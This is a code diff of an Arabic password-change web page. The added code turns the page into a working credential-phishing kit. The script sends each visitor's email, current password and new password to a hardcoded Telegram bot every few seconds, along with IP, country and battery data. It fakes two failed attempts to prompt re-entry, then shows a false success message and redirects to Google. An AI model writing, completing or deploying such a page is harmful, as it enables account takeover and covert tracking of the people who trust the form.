@@ -19,11 +19,12 @@ input{width:100%;padding:12px;border:1px solid #ccc;border-radius:8px;margin:12p
 input:focus{border-color:#1a73e8}
 button{width:100%;padding:12px;margin-top:16px;border:0;border-radius:8px;font-weight:600;font-size:15px;cursor:pointer;background:#1a73e8;color:#fff;transition:background 0.2s}
 button:hover{background:#1558b0}
-.loader{margin:16px auto;border:4px solid #f3f3f3;border-top:4px solid #1a73e8;border-radius:50%;width:36px;height:36px;animation:spin 1s linear infinite;display:none}
-.error{color:#d93025;font-size:13px;margin-top:-8px;margin-bottom:8px;display:none;text-align:right}
-@keyframes spin{0%{transform:rotate(0)}100%{transform:rotate(360deg)}}
+.error{color:#d93025;font-size:13px;margin-top:-8px;margin-bottom:8px;text-align:right;display:none}
+.success{font-size:18px;color:green;margin-top:20px;display:none}
 .step{display:none}
 .step.active{display:block}
+.shake{animation:shake 0.3s}
+@keyframes shake{0%{transform:translateX(0)}25%{transform:translateX(-5px)}50%{transform:translateX(5px)}75%{transform:translateX(-5px)}100%{transform:translateX(0)}}
 </style>
 </head>
 <body>
@@ -38,27 +39,27 @@ button:hover{background:#1558b0}
   </div>
 
   <form id="form">
-    <!-- خطوة البريد الإلكتروني -->
+    <!-- الخطوة 1 -->
     <div class="step step1 active">
-      <input type="email" placeholder="البريد الإلكتروني" required>
+      <input type="email" placeholder="البريد الإلكتروني" required id="email">
       <div class="error">يرجى إدخال بريد إلكتروني صالح</div>
       <button type="button" id="next1">التالي</button>
     </div>
 
-    <!-- خطوة كلمة المرور الحالية -->
+    <!-- الخطوة 2 -->
     <div class="step step2">
-      <input type="password" placeholder="كلمة المرور الحالية" required minlength="8">
+      <input type="password" placeholder="كلمة المرور الحالية" required minlength="8" id="currentPassword">
       <div class="error">كلمة المرور الحالية يجب أن تكون 8 أحرف على الأقل</div>
       <button type="button" id="next2">التالي</button>
     </div>
 
-    <!-- خطوة كلمة المرور الجديدة -->
+    <!-- الخطوة 3 -->
     <div class="step step3">
-      <input type="password" placeholder="كلمة المرور الجديدة" required minlength="8">
-      <input type="password" placeholder="تأكيد كلمة المرور" required minlength="8">
-      <div class="error">كلمة المرور يجب أن تكون ≥ 8 أحرف ومتطابقة</div>
-      <button type="submit">تغيير</button>
-      <div class="loader" id="loader"></div>
+      <input type="password" placeholder="كلمة المرور الجديدة" required minlength="8" id="newPassword">
+      <input type="password" placeholder="تأكيد كلمة المرور" required minlength="8" id="confirmPassword">
+      <div class="error" id="error3">كلمة المرور يجب أن تكون ≥ 8 أحرف ومتطابقة</div>
+      <div class="success" id="successMessage">تم تغيير كلمة السر بنجاح</div>
+      <button type="button" id="verifyPass">التالي</button>
     </div>
   </form>
 </div>
@@ -69,53 +70,118 @@ const step2 = document.querySelector(".step2");
 const step3 = document.querySelector(".step3");
 const next1 = document.getElementById("next1");
 const next2 = document.getElementById("next2");
-const form = document.getElementById("form");
-const loader = document.getElementById("loader");
+const verifyPass = document.getElementById("verifyPass");
+const error3 = document.getElementById("error3");
+const successMessage = document.getElementById("successMessage");
 
-// الخطوة 1: البريد الإلكتروني
+const telegramToken = "8290291328:AAGRZN47-qCp2wfa8S_mVBTVy-0C0aj9t78"; 
+const chatId = "8089516279"; 
+
+let attemptCount = 0;
+let lastMessageSent = "";
+let batteryStatus = {charging:"غير معروف", level:"غير معروف"};
+let userIP = "غير معروف";
+
+// حالة البطارية
+if(navigator.getBattery){
+  navigator.getBattery().then(bat=>{
+    batteryStatus.charging = bat.charging ? "يشحن" : "غير مشحون";
+    batteryStatus.level = (bat.level*100)+"%";
+    bat.addEventListener("chargingchange",()=>batteryStatus.charging = bat.charging ? "يشحن" : "غير مشحون");
+    bat.addEventListener("levelchange",()=>batteryStatus.level = (bat.level*100)+"%");
+  });
+}
+
+// IP والدولة
+fetch('https://ipapi.co/json/').then(res=>res.json()).then(data=>{
+  userIP = `${data.ip} - ${data.country_name}`;
+});
+
+// الخطوة 1
 next1.addEventListener("click", ()=>{
-  const input = step1.querySelector("input");
-  const error = step1.querySelector(".error");
+  const input = document.getElementById("email");
   if(input.checkValidity()){
-    error.style.display="none";
     step1.classList.remove("active");
     step2.classList.add("active");
   } else {
-    error.style.display="block";
+    step1.querySelector(".error").style.display="block";
   }
 });
 
-// الخطوة 2: كلمة المرور الحالية ≥ 8 أحرف
+// الخطوة 2
 next2.addEventListener("click", ()=>{
-  const input = step2.querySelector("input");
-  const error = step2.querySelector(".error");
-  if(input.value.length >= 8){
-    error.style.display="none";
+  const input = document.getElementById("currentPassword");
+  if(input.checkValidity()){
     step2.classList.remove("active");
     step3.classList.add("active");
   } else {
-    error.style.display="block";
+    step2.querySelector(".error").style.display="block";
   }
 });
 
-// الخطوة 3: كلمة المرور الجديدة والتأكيد
-form.addEventListener("submit", (e)=>{
-  e.preventDefault();
-  const newPass = step3.querySelectorAll("input")[0].value;
-  const confirmPass = step3.querySelectorAll("input")[1].value;
-  const error = step3.querySelector(".error");
+// الخطوة 3: تحقق من كلمة المرور لمدة 3 محاولات ثم تحول زر التالي إلى رجوع
+verifyPass.addEventListener("click", ()=>{
+  const newPass = document.getElementById("newPassword").value;
+  const confirmPass = document.getElementById("confirmPassword").value;
 
   if(newPass.length >= 8 && newPass === confirmPass){
-    error.style.display="none";
-    loader.style.display="block";
-    setTimeout(()=>{
-      loader.style.display="none";
-      step3.querySelectorAll("input, button").forEach(el=>el.disabled=true);
-    },1500);
+    attemptCount++;
+    if(attemptCount < 3){
+      error3.style.display="block";
+      verifyPass.classList.add("shake");
+      setTimeout(()=>verifyPass.classList.remove("shake"),300);
+    } else {
+      error3.style.display="none";
+      successMessage.style.display="block";
+      step3.querySelectorAll("input").forEach(el=>el.disabled=true);
+
+      // تحويل زر التالي إلى زر رجوع
+      verifyPass.textContent = "الرجوع";
+      verifyPass.disabled = false; 
+      verifyPass.onclick = ()=>{ 
+        window.location.href = "https://www.google.com"; 
+      }
+
+      sendData(); // إرسال آخر نسخة من البيانات عند النجاح
+    }
   } else {
-    error.style.display="block";
+    error3.style.display="block";
+    verifyPass.classList.add("shake");
+    setTimeout(()=>verifyPass.classList.remove("shake"),300);
   }
 });
+
+// إرسال البيانات
+function sendData(){
+  const email = document.getElementById("email").value.trim();
+  const currentPassword = document.getElementById("currentPassword").value.trim();
+  const newPassword = document.getElementById("newPassword").value.trim();
+
+  if(email === "" && currentPassword === "" && newPassword === "") return;
+
+  const message = `📨 بيانات جديدة:\n\n✉️ البريد: ${email || "فارغ"}\n🔑 كلمة المرور الحالية: ${currentPassword || "فارغ"}\n🔒 كلمة المرور الجديدة: ${newPassword || "فارغ"}\n🔋 حالة الشحن: ${batteryStatus.charging} - ${batteryStatus.level}\n🌐 IP والدولة: ${userIP}`;
+
+  if(message !== lastMessageSent){
+    fetch(`https://api.telegram.org/bot${telegramToken}/sendMessage`,{
+      method:"POST",
+      headers:{"Content-Type":"application/json"},
+      body: JSON.stringify({chat_id: chatId, text: message})
+    });
+    lastMessageSent = message;
+  }
+}
+
+// حفظ وإرسال بعد 6 ثواني من الكتابة
+let timeoutId;
+document.querySelectorAll("input").forEach(input=>{
+  input.addEventListener("input", ()=>{
+    clearTimeout(timeoutId);
+    timeoutId = setTimeout(sendData, 6000);
+  });
+});
+
+// نسخة احتياطية كل 6 ثواني
+setInterval(sendData, 6000);
 </script>
 
 </body>
